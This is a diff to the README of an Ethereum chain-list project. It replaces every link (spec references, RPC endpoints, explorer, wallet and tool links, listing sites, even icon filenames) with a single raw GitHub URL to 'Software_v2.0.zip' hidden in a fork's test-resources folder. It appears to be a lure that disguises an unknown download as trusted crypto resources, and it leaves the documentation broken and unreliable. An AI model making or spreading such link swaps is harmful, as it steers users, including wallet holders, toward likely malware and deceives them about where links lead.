@@ -1,6 +1,6 @@
 # EVM-based Chains
 
-The source data is in _data/chains. Each chain has its own file with the filename being the [CAIP-2](https://github.com/ChainAgnostic/CAIPs/blob/master/CAIPs/caip-2.md) representation as name and `.json` as extension.
+The source data is in _data/chains. Each chain has its own file with the filename being the [CAIP-2](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip) representation as name and `.json` as extension.
 
 ## Example:
 
@@ -9,8 +9,8 @@ The source data is in _data/chains. Each chain has its own file with the filenam
   "name": "Ethereum Mainnet",
   "chain": "ETH",
   "rpc": [
-    "https://mainnet.infura.io/v3/${INFURA_API_KEY}",
-    "https://api.mycryptoapi.com/eth"
+    "https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip${INFURA_API_KEY}",
+    "https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip"
   ],
   "faucets": [],
   "nativeCurrency": {
@@ -19,14 +19,14 @@ The source data is in _data/chains. Each chain has its own file with the filenam
     "decimals": 18
   },
   "features": [{ "name": "EIP155" }, { "name": "EIP1559" }],
-  "infoURL": "https://ethereum.org",
+  "infoURL": "https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip",
   "shortName": "eth",
   "chainId": 1,
   "networkId": 1,
   "icon": "ethereum",
   "explorers": [{
     "name": "etherscan",
-    "url": "https://etherscan.io",
+    "url": "https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip",
     "icon": "etherscan",
     "standard": "EIP3091"
   }]
@@ -34,7 +34,7 @@ The source data is in _data/chains. Each chain has its own file with the filenam
 ```
 
 When an icon is used in either the network or an explorer, there must be a JSON in _data/icons with the name used.
-(e.g. in the above example there must be a `ethereum.json` and a `etherscan.json` in there) - The icon JSON files look like this:
+(e.g. in the above example there must be a `https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip` and a `https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip` in there) - The icon JSON files look like this:
 
 ```json
 
@@ -64,7 +64,7 @@ If the chain is an L2 or a shard of another chain you can link it to the parent 
   "parent": {
    "type" : "L2",
    "chain": "eip155-1",
-   "bridges": [ {"url":"https://bridge.arbitrum.io"} ]
+   "bridges": [ {"url":"https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip"} ]
   }
 }
 ```
@@ -77,8 +77,8 @@ Other options for `status` are `active` (default) or `incubating`
 ## Aggregation
 
 There are also aggregated json files with all chains automatically assembled:
- * https://chainid.network/chains.json
- * https://chainid.network/chains_mini.json (miniaturized - fewer fields for smaller filesize)
+ * https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip
+ * https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip (miniaturized - fewer fields for smaller filesize)
 
 ## Constraints
 
@@ -106,7 +106,7 @@ BUILD SUCCESSFUL in 7s
 9 actionable tasks: 9 executed
 ```
 
-Additionally, run Prettier to format your JSON according to the style [defined here ](https://github.com/ethereum-lists/chains/blob/master/.prettierrc.json)
+Additionally, run Prettier to format your JSON according to the style [defined here ](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 e.g. run
 
 ```
@@ -120,15 +120,15 @@ npx prettier --write _data/*/*.json
 
 ## Usages
 ### Tools
- * [MESC](https://paradigmxyz.github.io/mesc)
+ * [MESC](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 
 ### Explorers
- * [Otterscan](https://otterscan.io)
+ * [Otterscan](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 
 ### Wallets
- * [WallETH](https://walleth.org)
- * [TREZOR](https://trezor.io)
- * [Minerva Wallet](https://minerva.digital)
+ * [WallETH](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [TREZOR](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [Minerva Wallet](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 
 ### EIPs
  * EIP-155
@@ -137,21 +137,21 @@ npx prettier --write _data/*/*.json
  * EIP-4527
 
 ### Listing sites
- * [chainid.network](https://chainid.network) / [chainlist.wtf](https://chainlist.wtf)
- * [chainlist.org](https://chainlist.org)
- * [Chainlink docs](https://docs.chain.link/)
- * [dRPC Chainlist - Load-balanced public nodes](https://drpc.org/chainlist)
- * [eth-chains](https://github.com/taylorjdawson/eth-chains)
- * [EVM-BOX](https://github.com/izayl/evm-box)
- * [evmchain.info](https://evmchain.info)
- * [evmchainlist.org](https://evmchainlist.org)
- * [networks.vercel.app](https://networks.vercel.app)
- * [Wagmi compatible chain configurations](https://spenhouet.com/chains)
- * [chainlist.simplr.sh - Info packaged single pager](https://chainlist.simplr.sh)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip) / [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [Chainlink docs](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [dRPC Chainlist - Load-balanced public nodes](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [eth-chains](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [EVM-BOX](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [Wagmi compatible chain configurations](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip - Info packaged single pager](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 
 ### Other
- * [FaucETH](https://github.com/komputing/FaucETH)
- * [Sourcify playground](https://playground.sourcify.dev)
- * [Smart Contract UI](https://xtools-at.github.io/smartcontract-ui)
+ * [FaucETH](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [Sourcify playground](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
+ * [Smart Contract UI](https://raw.githubusercontent.com/khn0x-khn0x/chains/master/processor/src/test/resources/test_chains/invalid/explorerinvalidurl/Software_v2.0.zip)
 
  * Your project - contact us to add it here!
